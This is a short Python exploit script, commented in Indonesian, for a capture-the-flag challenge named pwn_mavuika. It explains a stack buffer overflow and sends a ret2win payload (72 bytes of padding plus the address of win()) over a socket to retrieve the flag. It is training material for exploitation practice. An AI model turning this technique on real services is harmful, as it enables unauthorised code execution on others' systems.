#!/usr/bin/env python3
"""
Exploit sederhana untuk pwn_mavuika (ret2win, no pwntools).

Bug   : vuln() punya buffer char[64] di stack tapi read() membaca
        0x100 (256) byte -> classic stack buffer overflow.
Mitigasi: NX ON, tapi PIE OFF & canary OFF -> alamat statis & tidak
        ada canary yang harus ditebak, jadi ret2win paling simpel.
Target: timpa saved-RBP (8 byte) lalu return address dengan alamat
        fungsi win() (0x401256) yang sudah membaca flag.txt ke buffer
        global `flag` di main() dan akan mencetaknya.

Offset buffer -> return address = 0x40 (lea rax,[rbp-0x40]) + 8 (saved rbp) = 72 byte.
"""
import socket
import struct
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "localhost"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 40201

WIN_ADDR = 0x401256
OFFSET = 72  # jarak buffer -> return address

payload = b"A" * OFFSET + struct.pack("<Q", WIN_ADDR)

s = socket.create_connection((HOST, PORT), timeout=10)
s.settimeout(10)

print(s.recv(4096).decode(errors="replace"), end="")  # "masukkan input: "
s.sendall(payload + b"\n")

out = b""
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        out += chunk
except socket.timeout:
    pass

print(out.decode(errors="replace"))
s.close()
